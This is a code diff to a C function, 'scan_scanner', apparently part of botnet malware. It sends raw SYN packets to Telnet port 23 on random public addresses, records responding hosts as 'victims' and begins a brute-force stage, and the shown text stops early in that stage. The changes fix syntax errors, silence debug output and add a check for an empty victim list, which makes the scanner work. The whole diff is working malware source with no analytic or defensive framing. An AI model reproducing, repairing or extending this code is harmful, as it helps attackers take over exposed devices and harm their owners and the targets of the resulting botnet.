@@ -212,15 +212,11 @@ bool scan_scanner(void)
 	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
 	iph->id = htons(54321); // Id of this packet
 	iph->frag_off = htons(16384);
-	/*
-		  TTL = TTL goes down onces for ever re-router it hits
-		  If it hits 0 its discarded and icmp error sent
-  */
-	iph->ttl = 64;
+	iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
 	iph->protocol = 6; // 6 = TCP
 
 	// TCP header fillout
-	tcph->source= htons(LOCAL_PORT);
+	tcph->source = htons(LOCAL_PORT);
 	tcph->dest = htons(23); // Port 23 dest
 	tcph->seq = htonl(1105024978);
 	tcph->ack_seq = 0;
@@ -233,24 +229,23 @@ bool scan_scanner(void)
 	tcph->urg = 0;
 	tcph->window = htons(14600); // Maximum allowed window size
 	tcph->urg_ptr = 0;
-	tcph->dest = htons(23); // Port 23
 
 	// Create a raw socket
 	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
 	{
-		printd("Failed to open raw socket")
+		printd("Failed to open raw socket");
 		goto end;
 	}
 
 	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1)
 	{
-		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno))
+		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno));
 		goto end;
 	}
 
 	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0)
 	{
-		printd("Failed to set IP_HDRINCL")
+		printd("Failed to set IP_HDRINCL");
 		goto end;
 	}
 
@@ -259,7 +254,7 @@ bool scan_scanner(void)
 
 	while (1)
 	{
-		printd("Sending packets...")
+		// printd("Sending packets...")
 		for (i = 0; i < SCAN_SCANNER_BURST; i++)
 		{
 			addr.sin_addr.s_addr = ipv4_random_public(); // It should already be a 32 bit uint
@@ -283,31 +278,34 @@ bool scan_scanner(void)
 			{
 				if (++fails >= SCAN_SCANNER_ERRMAX)
 				{
-					printd("Fails has surpassed %d Resetting fail count", SCAN_SCANNER_ERRMAX)
+					printd("Fails has surpassed %d Resetting fail count", SCAN_SCANNER_ERRMAX);
 					fails = 0;
 				}
 			}
 		}
 		i = 0;
+		// printd("Moving to recvfrom()");
 		while (1)
 		{
-			unsigned char buf[1024];
+			unsigned char buf[4000];
 			errno = 0;
 
-			sleep(1);
 			if (recvfrom(sock, buf, 1024, 0, NULL, NULL) <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
 			{
-				printd("Failed to recv, moving on.")
+				// printd("Failed to recv, moving on.");
 				break;
 			}
 
+
 			struct iphdr *riph = (struct iphdr *)buf;
 			unsigned short iphdrlen;
-			if (riph->protocol == 6)
+			if (riph->protocol == 6) // Packet needs to be TCP
 			{
 				iphdrlen = riph->ihl * 4;
 				struct tcphdr *rtcph = (struct tcphdr *)(buf + iphdrlen);
 
+				printd("Got a live one! %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack,rtcph->fin);
+				
 				// Check that it is a SYN ACK and if it matches our source port
 				if (rtcph->syn == 1 && rtcph->ack == 1 && rtcph->dest == LOCAL_PORT && rtcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
 				{
@@ -317,7 +315,7 @@ bool scan_scanner(void)
 					char ipstr[INET_ADDRSTRLEN];
 					addr.sin_addr.s_addr = riph->saddr;
 					inet_ntop(AF_INET, &(addr.sin_addr), ipstr, INET_ADDRSTRLEN);
-					printd("Adding IP: %s/%s", ipstr, ipv4_unpack(riph->saddr))
+					printd("Adding IP: %s/%s", ipstr, ipv4_unpack(riph->saddr));
 }
 #endif
 					struct scan_victim *victim;
@@ -332,8 +330,15 @@ bool scan_scanner(void)
 				}
 			}
 		}
+		// printd("Moving to bruteforce");
 		while (1)
 		{
+			if (i <= 0)
+			{
+				// printd("No IPs added, breaking")
+				break;
+			}
+
 			struct sockaddr_in addrx;
 			addrx.sin_family = AF_INET;
 			addrx.sin_port = htons(23);
